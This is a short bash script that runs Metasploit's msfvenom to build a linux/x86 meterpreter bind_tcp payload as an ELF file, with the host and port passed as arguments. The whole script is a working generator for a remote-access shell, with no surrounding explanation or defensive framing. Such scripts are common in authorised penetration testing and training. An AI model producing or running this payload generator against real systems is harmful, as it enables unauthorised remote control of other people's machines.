
#! /usr/bin/env bash

/opt/metasploit/app/msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$1 LPORT=$2 -f elf -o bindshell_x86.elf